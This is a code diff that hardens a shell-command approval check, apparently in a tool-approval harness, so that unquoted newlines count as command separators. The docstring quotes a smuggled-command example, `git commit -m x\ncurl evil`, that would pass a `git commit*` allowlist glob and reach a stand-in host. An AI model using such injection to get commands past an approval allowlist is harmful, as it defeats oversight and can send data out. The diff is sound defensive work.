@@ -248,12 +248,17 @@ class AsyncCallbackApprovalHandler(ApprovalHandler):
 def _has_shell_control_operator(command: str) -> bool:
     """True if ``command`` contains an unquoted shell control / substitution operator.
 
-    Scans for ``;``, ``|``, ``&`` (command separators) only when OUTSIDE a quoted
-    span, so a literal ``;`` inside ``git commit -m "a; b"`` is NOT flagged.
-    Command substitution (``$(...)`` and backticks) is flagged EVEN inside double
-    quotes -- bash executes it there, and this gate is for the single-command job
-    allowlist where conservative denial is safe (cost of a false positive = one
-    auto-approve withheld; cost of a false negative = exfil past the glob).
+    Scans for ``;``, ``|``, ``&`` and unquoted newlines (``\\n``/``\\r``) (command
+    separators) only when OUTSIDE a quoted span, so a literal ``;`` inside
+    ``git commit -m "a; b"`` is NOT flagged. Command substitution (``$(...)`` and
+    backticks) is flagged EVEN inside double quotes -- bash executes it there, and
+    this gate is for the single-command job allowlist where conservative denial is
+    safe (cost of a false positive = one auto-approve withheld; cost of a false
+    negative = exfil past the glob). Newline is a command separator under
+    ``shell=True`` (``run_shell``), so an unquoted ``\\n`` smuggles a second
+    command past the glob -- ``git commit -m x\\ncurl evil`` would match
+    ``git commit*`` and run both. A newline INSIDE a quoted span (a multi-line
+    commit message) is not a separator and is correctly left unflagged.
     """
     i = 0
     n = len(command)
@@ -280,7 +285,7 @@ def _has_shell_control_operator(command: str) -> bool:
         if ch == "\\" and i + 1 < n:
             i += 2
             continue
-        if ch in (";", "|", "&"):
+        if ch in (";", "|", "&", "\n", "\r"):
             return True
         i += 1
     return False
